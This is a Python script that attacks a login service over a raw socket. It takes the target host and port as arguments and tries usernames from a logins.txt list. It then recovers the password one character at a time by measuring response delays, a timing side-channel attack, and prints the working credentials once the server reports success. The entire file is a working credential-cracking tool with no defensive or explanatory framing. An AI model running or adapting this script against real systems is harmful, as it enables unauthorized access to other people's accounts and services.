import argparse
from socket import socket
from json import loads, dumps
from string import ascii_letters, digits
from time import perf_counter


def new_login():
    with open("logins.txt", "r") as temp_login:
        for line in temp_login:
            word = line.strip()
            yield word


parser = argparse.ArgumentParser()
parser.add_argument("host", help="Enter IP address")
parser.add_argument("port", help="Enter port from 1024 to 65535")

args = parser.parse_args()

ip_address = args.host
port = int(args.port)
address = (ip_address, port)
login = new_login()
response = {"result": ""}

correct_login = next(login)
password = ""
login_check = True

with socket() as client_socket:
    x = 0
    char_list = list(ascii_letters) + list(digits)

    client_socket.connect(address)

    while login_check:
        if x < len(char_list):
            data_dict = {"login": correct_login, "password": str(char_list[x])}
            x += 1
            data = dumps(data_dict).encode()
            start = perf_counter()
            client_socket.send(data)
            response = loads(client_socket.recv(1024).decode())
            end = perf_counter()
            total_count = end - start
            if total_count >= 0.1:
                login_check = False
                x = 0
        else:
            correct_login = next(login)
            x = 0
    while response["result"] != "Connection success!":
        data_dict = {"login": correct_login, "password": password + (char_list[x])}
        data = dumps(data_dict).encode()
        start = perf_counter()
        client_socket.send(data)
        response = loads(client_socket.recv(1024).decode())
        end = perf_counter()
        total_count = end - start
        if response["result"] == "Connection success!":
            print(dumps(data_dict))
            break
        elif total_count >= 0.1:
            password += str(char_list[x])
            x = 0
        x += 1
